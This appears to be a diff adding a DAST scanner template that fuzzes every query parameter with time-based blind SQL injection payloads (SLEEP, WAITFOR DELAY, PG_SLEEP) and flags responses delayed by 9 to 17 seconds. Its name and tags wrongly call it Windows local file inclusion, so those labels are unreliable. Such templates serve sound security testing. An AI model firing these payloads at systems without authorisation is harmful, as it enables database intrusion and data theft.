@@ -1,0 +1,45 @@
+id: time-based-sqli
+
+info:
+  name: Local File Inclusion - Windows
+  author: pussycat0x
+  severity: high
+  tags: lfi,windows,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      injection:
+        - "14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(9)))CwkU)%20AND%20(7515=7515"
+        - "'XOR(if(now()=sysdate(),sleep(9),0))OR"
+        - "0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z%20=%3E"
+        - "';if(now()=sysdate()%2Csleep(9)%2C0)"
+        - "if(now()=sysdate(),sleep(9),0)"
+        - "';SELECT IF((8303>8302),SLEEP(9),2356)#"
+        - "';SELECT IF((2>1),SLEEP(9),4)#"
+        - "';XOR(if(now()=sysdate(),sleep(9),0))XOR'Z"
+        - "';(SELECT*FROM(SELECT(SLEEP(9)))a)"
+        - "%2b(select*from(select(sleep(9)))a)%2b"
+        - "';%20waitfor%20delay%20'0:0:9'%20--%20"
+        - "'%3b+waitfor+delay+'0%3a0%3a9'+--"
+        - "'%20WAITFOR%20DELAY%20'0:0:9'--"
+        - "';%20waitfor%20delay%20'0:0:9'%20--%20"
+        - "*'+(select(0)from(select(sleep(9)))v)+'"
+        - "') OR 11=(SELECT 11 FROM PG_SLEEP(9))--"
+        - "orwa';%20waitfor%20delay%20'0:0:9'%20--%20"
+        - "orwa') OR 11=(SELECT 11 FROM PG_SLEEP(9))--"
+  
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=9 && duration<=17"
